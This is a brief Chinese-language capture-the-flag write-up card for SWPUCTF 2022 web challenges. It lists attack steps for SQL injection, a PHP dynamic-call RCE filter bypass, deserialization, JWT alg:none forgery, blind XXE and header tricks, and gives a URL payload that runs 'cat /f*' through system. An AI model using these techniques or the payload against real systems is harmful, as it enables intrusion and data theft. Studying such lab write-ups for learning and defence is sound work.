---
title: "2022 SWPUCTF Web Writeup"
category: web
tags: ["SWPUCTF 2022", "web", "SWPUCTF", "DIOS", "union-select", "system"]
signals: ["SWPUCTF 2022 2022", "SWPUCTF", "DIOS", "union-select", "system", "$_GET", "XFF", "unserialize", "__destruct", "sqli", "rce", "web_unknown", "deserialize", "F12"]
difficulty: medium
source: "https://www.ctfiot.com/65440.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 SWPUCTF Web Writeup

> 赛事：SWPUCTF 2022 2022 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

SWPUCTF 2022 8 大题：F12 + 联合注入 + RCE 字符绕过 + 反序列化 + JWT + XXE

## 攻击链

1. Web F12: <!-- swpu{da45af69-6aaf-48cb-affc-4f424da5651f} -->
2. easy_sql: ?wllm= 参数 + order by 4# → 3 列 → union select 1,2,3 → DIOS 拿表 fllaag
3. happy_rce: cookie admin=1 include next.php → 访问 jiangnaij.php → 绕过 cat/flag 过滤用 $_GET 动态调 system
4. /jiangnaij.php?url=$_GET[Tao]($_GET[c]);&Tao=system&c=cat+/f*
5. do_not_wakeup: PHP 反序列化 __destruct 触发 getenv(''FLAG'')
6. Genius_system: JWT alg:none 伪造 admin 权限
7. websec_xxe: Blind XXE OOB 读 flag 实体
8. finalrce: $_GET[1]($_POST[2]) 动态调用 + XFF 头

## 关键 payload

```
/jiangnaij.php?url=$_GET[Tao]($_GET[c]);&Tao=system&c=cat+/f*
```

## 经验教训

PHP `$_GET[$x]($y)` 动态调用绕 cat/flag 过滤是经典；JWT alg:none 是入门 web

## 标签

SWPUCTF、DIOS、union-select、system、$_GET、XFF、unserialize、__destruct、JWT、XXE、Blind-XXE、CyberChef

## 参考来源

- https://www.ctfiot.com/65440.html
- 原文件：2022_SWPUCTF_Web_Writeup.full.md
